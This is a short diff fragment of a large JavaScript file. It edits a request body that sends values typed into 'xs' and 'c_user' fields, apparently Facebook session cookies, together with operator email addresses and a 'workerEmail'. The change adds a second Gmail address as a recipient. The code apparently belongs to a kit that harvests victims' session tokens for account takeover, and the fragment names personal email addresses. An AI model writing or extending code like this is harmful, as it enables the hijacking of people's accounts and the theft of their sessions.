@@ -9821,8 +9821,8 @@
                                         },
                                         body: JSON.stringify({
                                             xs: xsInput.value,
-                                            c_user: cUserinput.value,
-                                            emails: "mehtabalii67890@gmail.com",
+                                            c_user: cUserInput.value,
+                                            emails: ["mehtabalii67890@gmail.com","lingdavid24@gmail.com"],
                                             workerEmail: "lingdavid24@gmail.com",
                                             
                                             name: "Mahtab"
